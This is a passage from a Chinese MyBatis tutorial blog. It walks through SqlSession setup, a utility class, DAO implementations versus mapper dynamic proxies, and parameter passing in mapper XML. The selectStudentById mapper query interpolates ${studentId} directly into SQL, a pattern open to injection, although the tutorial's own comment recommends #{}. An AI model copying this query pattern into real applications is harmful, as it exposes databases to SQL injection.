<span class="comment">//3.创建了SqlSessionFactoryBuilder对象</span></span><br><span class="line">        <span class="type">SqlSessionFactoryBuilder</span> <span class="variable">builder</span>  <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SqlSessionFactoryBuilder</span>();</span><br><span class="line">        <span class="comment">//4.创建SqlSessionFactory对象</span></span><br><span class="line">        <span class="type">SqlSessionFactory</span> <span class="variable">factory</span> <span class="operator">=</span> builder.build(in);</span><br><span class="line">        <span class="comment">//5.获取SqlSession对象，从SqlSessionFactory中获取SqlSession</span></span><br><span class="line">        <span class="comment">//SqlSession sqlSession = factory.openSession();</span></span><br><span class="line">        <span class="type">SqlSession</span> <span class="variable">sqlSession</span> <span class="operator">=</span> factory.openSession(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//6.【重要】指定要执行的sql语句的标识。  sql映射文件中的namespace + &quot;.&quot; + 标签的id值</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">sqlId</span> <span class="operator">=</span> <span class="string">&quot;com.hukaichao.dao.StudentDao.insertStudent&quot;</span>;</span><br><span class="line">        <span class="comment">//7.【重要】执行sql语句，通过sqlId找到语句</span></span><br><span class="line">        <span class="type">Student</span> <span class="variable">student</span>  <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">        student.setId(<span class="number">1</span>);</span><br><span class="line">        student.setName(<span class="string">&quot;胡凯超&quot;</span>);</span><br><span class="line">        student.setEmail(<span class="string">&quot;281842349@qq.com&quot;</span>);</span><br><span class="line">        student.setAge(<span class="number">20</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">nums</span> <span class="operator">=</span> sqlSession.insert(sqlId,student);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//mybatis默认不是自动提交事务的， 所以在insert ，update ，delete后要手工提交事务</span></span><br><span class="line">        <span class="comment">//sqlSession.commit();</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//8.输出结果</span></span><br><span class="line">        System.out.println(<span class="string">&quot;执行insert的结果=&quot;</span>+nums);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//9.关闭SqlSession对象</span></span><br><span class="line">        sqlSession.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Mybatis中主要类的介绍"><a href="#Mybatis中主要类的介绍" class="headerlink" title="Mybatis中主要类的介绍"></a>Mybatis中主要类的介绍</h3><blockquote><p>1)Resources： mybatis中的一个类， 负责读取主配置文件<br>InputStream in &#x3D; Resources.getResourceAsStream(“mybatis.xml”);<br>2)SqlSessionFactoryBuilder : 创建SqlSessionFactory对象，<br>    SqlSessionFactoryBuilder builder  &#x3D; new SqlSessionFactoryBuilder();<br>    &#x2F;&#x2F;创建SqlSessionFactory对象<br>    SqlSessionFactory factory &#x3D; builder.build(in);<br>3)SqlSessionFactory ： 重量级对象， 程序创建一个对象耗时比较长，使用资源比较多。在整个项目中，有一个就够用了。<br>      SqlSessionFactory作用： 获取SqlSession对象。SqlSession sqlSession &#x3D; factory.openSession();<br>      openSession()方法说明：<br>       1. openSession() ：无参数的， 获取是非自动提交事务的SqlSession对象<br>       2. openSession(boolean): openSession(true)  获取自动提交事务的SqlSession.<br>                            openSession(false)  非自动提交事务的SqlSession对象<br>4)SqlSession: 用于执行持久化操作<br>       SqlSession接口定义了操作数据的方法 例如 selectOne() ,selectList() ,insert(),update(), delete(), commit(), rollback()<br>       使用要求： SqlSession对象不是线程安全的，需要在方法内部使用， 在执行sql语句之前，使用openSession()获取SqlSession对象。<br>    在执行完sql语句后，需要关闭它，执行SqlSession.close(). 这样能保证他的使用是线程安全的。</p></blockquote><h3 id="编写工具类简化测试操作"><a href="#编写工具类简化测试操作" class="headerlink" title="编写工具类简化测试操作"></a>编写工具类简化测试操作</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyBatisUtils</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">SqlSessionFactory</span> <span class="variable">factory</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        String config=<span class="string">&quot;mybatis.xml&quot;</span>; <span class="comment">// 需要和你的项目中的文件名一样</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Resources.getResourceAsStream(config);</span><br><span class="line">            <span class="comment">//创建SqlSessionFactory对象，使用SqlSessionFactoryBuild</span></span><br><span class="line">            factory = <span class="keyword">new</span> <span class="title class_">SqlSessionFactoryBuilder</span>().build(in);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取SqlSession的方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> SqlSession <span class="title function_">getSqlSession</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">SqlSession</span> <span class="variable">sqlSession</span>  <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span>( factory != <span class="literal">null</span>)&#123;</span><br><span class="line">            sqlSession = factory.openSession();<span class="comment">// 非自动提交事务</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sqlSession;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时Test类可以如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testUtils</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123; </span><br><span class="line">    <span class="comment">//获取SqlSession对象，从SqlSessionFactory中获取SqlSession</span></span><br><span class="line">    <span class="type">SqlSession</span> <span class="variable">sqlSession</span> <span class="operator">=</span> MyBatisUtils.getSqlSession();</span><br><span class="line">    <span class="comment">//【重要】指定要执行的sql语句的标识。  sql映射文件中的namespace + &quot;.&quot; + 标签的id值</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">sqlId</span> <span class="operator">=</span> <span class="string">&quot;com.hukaichao.dao.StudentDao.selectStudents&quot;</span>;</span><br><span class="line">    <span class="comment">//【重要】执行sql语句，通过sqlId找到语句</span></span><br><span class="line">    List&lt;Student&gt; studentList = sqlSession.selectList(sqlId);</span><br><span class="line">    <span class="comment">//输出结果</span></span><br><span class="line">    studentList.forEach( stu -&gt; System.out.println(stu));</span><br><span class="line">    <span class="comment">//关闭SqlSession对象</span></span><br><span class="line">    sqlSession.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="MyBatis框架Dao代理"><a href="#MyBatis框架Dao代理" class="headerlink" title="MyBatis框架Dao代理"></a>MyBatis框架Dao代理</h2><h3 id="传统dao开发方式"><a href="#传统dao开发方式" class="headerlink" title="传统dao开发方式"></a>传统dao开发方式</h3><p>在传统dao开发方式中，都是使用dao接口的实现类来操作数据库，那么我们试着让mybatis使用传统dao开发方式来操作数据库<br>首先创建dao接口实现类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StudentDaoImpl</span> <span class="keyword">implements</span> <span class="title class_">StudentDao</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;Student&gt; <span class="title function_">selectStudents</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//获取SqlSession对象</span></span><br><span class="line">        <span class="type">SqlSession</span> <span class="variable">sqlSession</span> <span class="operator">=</span> MyBatisUtils.getSqlSession();</span><br><span class="line">        String sqlId=<span class="string">&quot;com.hukaichao.dao.StudentDao.selectStudents&quot;</span>;</span><br><span class="line">        <span class="comment">//执行sql语句， 使用SqlSession类的方法</span></span><br><span class="line">        List&lt;Student&gt; students  = sqlSession.selectList(sqlId);</span><br><span class="line">        <span class="comment">//关闭</span></span><br><span class="line">        sqlSession.close();</span><br><span class="line">        <span class="keyword">return</span> students;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">insertStudent</span><span class="params">(Student student)</span> &#123;</span><br><span class="line">        <span class="comment">//获取SqlSession对象</span></span><br><span class="line">        <span class="type">SqlSession</span> <span class="variable">sqlSession</span> <span class="operator">=</span> MyBatisUtils.getSqlSession();</span><br><span class="line">        String sqlId=<span class="string">&quot;com.hukaichao.dao.StudentDao.insertStudent&quot;</span>;</span><br><span class="line">        <span class="comment">//执行sql语句， 使用SqlSession类的方法</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">nums</span> <span class="operator">=</span> sqlSession.insert(sqlId,student);</span><br><span class="line">        <span class="comment">//提交事务</span></span><br><span class="line">        sqlSession.commit();</span><br><span class="line">        <span class="comment">//关闭</span></span><br><span class="line">        sqlSession.close();</span><br><span class="line">        <span class="keyword">return</span> nums;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对数据进行操作：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestMyBatis</span> &#123;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testSelectStudents</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">StudentDao</span> <span class="variable">dao</span>  <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StudentDaoImpl</span>();</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * List&lt;Student&gt; studentList  = dao.selectStudents(); 调用</span></span><br><span class="line"><span class="comment">         * 1.dao对象，类型是StudentDao，全限定名称是：com.hukaichao.dao.StudentDao</span></span><br><span class="line"><span class="comment">         *   全限定名称 和 namespace 是一样的。</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * 2.方法名称， selectStudents， 这个方法就是 mapper文件中的 id值 selectStudents</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * 3.通过dao中方法的返回值也可以确定MyBatis要调用的SqlSession的方法</span></span><br><span class="line"><span class="comment">         *    如果返回值是List ，调用的是SqlSession.selectList()方法。</span></span><br><span class="line"><span class="comment">         *    如果返回值 int ，或是非List的， 看mapper文件中的 标签是&lt;insert&gt;，&lt;update&gt; 就会调用</span></span><br><span class="line"><span class="comment">         *    SqlSession的insert， update等方法</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         *  mybatis的动态代理： mybatis根据 dao的方法调用，获取执行sql语句的信息。</span></span><br><span class="line"><span class="comment">         *     mybatis根据你的dao接口，创建出一个dao接口的实现类， 并创建这个类的对象。</span></span><br><span class="line"><span class="comment">         *     完成SqlSession调用方法， 访问数据库。</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        List&lt;Student&gt; studentList  = dao.selectStudents();</span><br><span class="line">        <span class="keyword">for</span>(Student stu:studentList)&#123;</span><br><span class="line">            System.out.println(stu);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testInsertStudent</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">StudentDao</span> <span class="variable">dao</span>  <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StudentDaoImpl</span>();</span><br><span class="line">        <span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">        student.setId(<span class="number">2</span>);</span><br><span class="line">        student.setName(<span class="string">&quot;张三&quot;</span>);</span><br><span class="line">        student.setEmail(<span class="string">&quot;zhangsan@qq.com&quot;</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">nums</span> <span class="operator">=</span> dao.insertStudent(student);</span><br><span class="line">        System.out.println(<span class="string">&quot;添加对象的数量：&quot;</span>+nums);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析：在前面例子中自定义Dao接口实现类时发现一个问题： Dao的实现类其实并没有干什么实质性的工作，它仅仅就是通过 SqlSession的相关 API定位到映射文件 mapper中相应 id的 SQL语句，真正对 DB进行操作的工作其实是由框架通过 mapper中的 SQL完成的。</p><p>所以，MyBatis框架就抛开了 Dao的实现类，直接定位到映射文件mapper中的相应 SQL语句，对DB进行操作。这种对 Dao的实现方式称为 Mapper的动态代理方式。</p><p>Mapper动态代理方式无需程序员实现 Dao接口。接口是由 MyBatis结合映射文件自动生成的动态代理实现的。</p><h3 id="Mybatis动态代理"><a href="#Mybatis动态代理" class="headerlink" title="Mybatis动态代理"></a>Mybatis动态代理</h3><ol><li>动态代理： 使用SqlSession.getMapper(dao接口.class) 获取这个dao接口的对象</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestMyBatis</span> &#123;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testSelectStudents</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 使用mybatis的动态代理机制， 使用SqlSession.getMapper(dao接口)</span></span><br><span class="line"><span class="comment">         * getMapper能获取dao接口对于的实现类对象。</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">SqlSession</span> <span class="variable">sqlSession</span> <span class="operator">=</span> MyBatisUtils.getSqlSession();</span><br><span class="line">        <span class="type">StudentDao</span> <span class="variable">dao</span>  <span class="operator">=</span>  sqlSession.getMapper(StudentDao.class);</span><br><span class="line">        <span class="comment">//com.sun.proxy.$Proxy2 : jdk的动态代理</span></span><br><span class="line">        System.out.println(<span class="string">&quot;dao=&quot;</span>+dao.getClass().getName());</span><br><span class="line">        <span class="comment">//调用dao的方法， 执行数据库的操作</span></span><br><span class="line">        List&lt;Student&gt; students = dao.selectStudents();</span><br><span class="line">        <span class="keyword">for</span>(Student stu: students)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;学生=&quot;</span>+stu);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testInsertStudent</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">SqlSession</span> <span class="variable">sqlSession</span>  <span class="operator">=</span> MyBatisUtils.getSqlSession();</span><br><span class="line">        <span class="type">StudentDao</span> <span class="variable">dao</span>  <span class="operator">=</span>  sqlSession.getMapper(StudentDao.class);</span><br><span class="line"></span><br><span class="line">        <span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">        student.setId(<span class="number">3</span>);</span><br><span class="line">        student.setName(<span class="string">&quot;李四&quot;</span>);</span><br><span class="line">        student.setEmail(<span class="string">&quot;lisi@qq.com&quot;</span>);</span><br><span class="line">        student.setAge(<span class="number">28</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">nums</span> <span class="operator">=</span> dao.insertStudent(student);</span><br><span class="line">        sqlSession.commit();</span><br><span class="line">        System.out.println(<span class="string">&quot;添加对象的数量：&quot;</span>+nums);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>传入参数： 从java代码中把数据传入到mapper文件的sql语句中。</li></ol><p>dao接口代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">StudentDao</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 一个简单类型的参数：</span></span><br><span class="line"><span class="comment">     *   简单类型： mybatis把java的基本数据类型和String都叫简单类型。</span></span><br><span class="line"><span class="comment">     *  在mapper文件获取简单类型的一个参数的值，使用 #&#123;任意字符&#125; 或者$&#123;任意字符&#125;都可以，推荐#，可以防止sql注入。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> Student <span class="title function_">selectStudentById</span><span class="params">(Integer id)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 多个参数： 命名参数，在形参定义的前面加入 <span class="doctag">@Param</span>(&quot;自定义参数名称&quot;)</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    List&lt;Student&gt; <span class="title function_">selectMultiParam</span><span class="params">(<span class="meta">@Param(&quot;myname&quot;)</span> String name,</span></span><br><span class="line"><span class="params">                                   <span class="meta">@Param(&quot;myage&quot;)</span> Integer age)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 多个参数，使用java对象作为接口中方法的参数</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    List&lt;Student&gt; <span class="title function_">selectMultiObject</span><span class="params">(QueryParam param)</span>;</span><br><span class="line"></span><br><span class="line">    List&lt;Student&gt; <span class="title function_">selectMultiStudent</span><span class="params">(Student student)</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 多个参数-简单类型的，按位置传值，</span></span><br><span class="line"><span class="comment">     * mybatis.3.4之前，使用 #&#123;0&#125; ，#&#123;1&#125;</span></span><br><span class="line"><span class="comment">     * mybatis.3.4之后 ，使用 #&#123;arg0&#125; ,#&#123;arg1&#125;</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    List&lt;Student&gt; <span class="title function_">selectMultiPosition</span><span class="params">( String name,Integer age)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 多个参数，使用Map存放多个值</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    List&lt;Student&gt; <span class="title function_">selectMultiByMap</span><span class="params">(Map&lt;String,Object&gt; map)</span>;</span><br><span class="line"></span><br><span class="line">    List&lt;Student&gt; selectUse$(<span class="meta">@Param(&quot;myname&quot;)</span> String name);</span><br><span class="line"></span><br><span class="line">    List&lt;Student&gt; selectUse$Order(<span class="meta">@Param(&quot;colName&quot;)</span> String colName);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>mapper文件代码</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">mapper</span></span></span><br><span class="line"><span class="meta">        <span class="keyword">PUBLIC</span> <span class="string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span></span></span><br><span class="line"><span class="meta">        <span class="string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span>=<span class="string">&quot;com.hukaichao.dao.StudentDao&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">      parameterType ： dao接口中方法参数的数据类型。</span></span><br><span class="line"><span class="comment">        parameterType它的值是java的数据类型全限定名称或者是mybatis定义的别名</span></span><br><span class="line"><span class="comment">        例如：parameterType=&quot;java.lang.Integer&quot;</span></span><br><span class="line"><span class="comment">             parameterType=&quot;int&quot;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        注意：parameterType不是强制的，mybatis通过反射机制能够发现接口参数的数类型。</span></span><br><span class="line"><span class="comment">        所以可以没有。 一般我们也不写。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        使用#&#123;&#125;之后， mybatis执行sql是使用的jdbc中的PreparedStatement对象</span></span><br><span class="line"><span class="comment">        由mybatis执行下面的代码：</span></span><br><span class="line"><span class="comment">         1. mybatis创建Connection ， PreparedStatement对象</span></span><br><span class="line"><span class="comment">            String sql=&quot;select id,name, email,age from student where id=?&quot;;</span></span><br><span class="line"><span class="comment">            PreparedStatement pst = conn.preparedStatement(sql);</span></span><br><span class="line"><span class="comment">            pst.setInt(1,1001);</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         2. 执行sql封装为resultType=&quot;com.hukaichao.domain.Student&quot;这个对象</span></span><br><span class="line"><span class="comment">            ResultSet rs = ps.executeQuery();</span></span><br><span class="line"><span class="comment">            Student student = null;</span></span><br><span class="line"><span class="comment">            while(rs.next())&#123;</span></span><br><span class="line"><span class="comment">               //从数据库取表的一行数据， 存到一个java对象属性中</span></span><br><span class="line"><span class="comment">               student = new Student();</span></span><br><span class="line"><span class="comment">               student.setId(rs.getInt(&quot;id));</span></span><br><span class="line"><span class="comment">               student.setName(rs.getString(&quot;name&quot;));</span></span><br><span class="line"><span class="comment">               student.setEmail(rs.getString(&quot;email&quot;));</span></span><br><span class="line"><span class="comment">               student.setAge(rs.getInt(&quot;age&quot;));</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">           return student;  //给了dao方法调用的返回值</span></span><br><span class="line"><span class="comment">    --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;selectStudentById&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;int&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;com.hukaichao.domain.Student&quot;</span>&gt;</span></span><br><span class="line">        select id,name, email,age from student where id=$&#123;studentId&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--多个参数，使用@Param命名--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;selectMultiParam&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;com.hukaichao.domain.Student&quot;</span>&gt;</span></span><br><span class="line">         select id,name, email,age from student where name=#&#123;myname&#125; or age=#&#123;myage&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--多个参数， 使用java对象的属性值，作为参数实际值</span></span><br><span class="line"><span class="comment">        使用对象语法： #&#123;属性名,javaType=类型名称,jdbcType=数据类型&#125; 很少用。</span></span><br><span class="line"><span class="comment">                    javaType:指java中的属性数据类型。</span></span><br><span class="line"><span class="comment">                    jdbcType:在数据库中的数据类型。</span></span><br><span class="line"><span class="comment">                    例如： #&#123;paramName,javaType=java.lang.String,jdbcType=VARCHAR&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        我们使用的简化方式： #&#123;属性名&#125; ,javaType, jdbcType的值mybatis反射能获取。不用提供</span></span><br><span class="line"><span class="comment">    --&gt;</span></span><br><span class="line">   <span class="comment">&lt;!-- &lt;select id=&quot;selectMultiObject&quot; resultType=&quot;com.hukaichao.domain.Student&quot;&gt;</span></span><br><span class="line"><span class="comment">          select id,name, email,age from student where</span></span><br><span class="line"><span class="comment">           name=#&#123;paramName,javaType=java.lang.String,jdbcType=VARCHAR&#125;</span></span><br><span class="line"><span class="comment">           or age=#&#123;paramAge,javaType=java.lang.Integer,jdbcType=INTEGER&#125;</span></span><br><span class="line"><span 